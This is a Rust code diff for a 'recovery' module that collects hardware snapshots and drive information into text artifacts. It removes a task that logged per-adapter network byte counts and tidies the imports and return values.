@@ -1,20 +1,18 @@
+use crate::recovery::helpers::winhttp::Client;
 use crate::recovery::{
     context::RecoveryContext,
-    helpers::{hardware as hardware_helpers, network as network_helpers},
+    helpers::hardware as hardware_helpers,
     output::write_text_artifact,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
-use crate::recovery::helpers::winhttp::Client;
 use std::fmt::Write;
 use std::sync::Arc;
-use tracing::warn;
 
 pub fn hardware_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     vec![
         Arc::new(HardwareSnapshotTask),
         Arc::new(HardwareDriveTask),
-        Arc::new(NetworkTrafficTask),
     ]
 }
 
@@ -41,7 +39,7 @@ impl RecoveryTask for HardwareSnapshotTask {
         )
         .await?;
 
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
@@ -68,34 +66,7 @@ impl RecoveryTask for HardwareDriveTask {
         )
         .await?;
 
-        Ok(vec![artifact])
-    }
-}
-
-struct NetworkTrafficTask;
-
-#[async_trait]
-impl RecoveryTask for NetworkTrafficTask {
-    fn label(&self) -> String {
-        "Network Traffic".to_string()
-    }
-
-    fn category(&self) -> RecoveryCategory {
-        RecoveryCategory::System
-    }
-
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let summary = gather_network_traffic().await;
-        let artifact = write_text_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "network-traffic.txt",
-            &summary,
-        )
-        .await?;
-
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
@@ -150,23 +121,4 @@ async fn gather_drive_info() -> String {
     writeln!(builder, "\nPartitions:\n{}", drive_details.partitions).ok();
     writeln!(builder, "\nLogical Disks:\n{}", drive_details.logical_disks).ok();
     builder
-}
-
-async fn gather_network_traffic() -> String {
-    match network_helpers::gather_network_traffic().await {
-        Ok(adapters) => {
-            let mut builder = String::new();
-            writeln!(builder, "Network Traffic Summary:").ok();
-            for adapter in adapters {
-                writeln!(builder, "Interface: {}", adapter.name).ok();
-                writeln!(builder, "  Received Bytes: {:?}", adapter.received_bytes).ok();
-                writeln!(builder, "  Sent Bytes: {:?}\n", adapter.transmitted_bytes).ok();
-            }
-            builder
-        }
-        Err(err) => {
-            warn!(error=?err, "failed to capture network traffic");
-            "Network traffic statistics unavailable".to_string()
-        }
-    }
 }
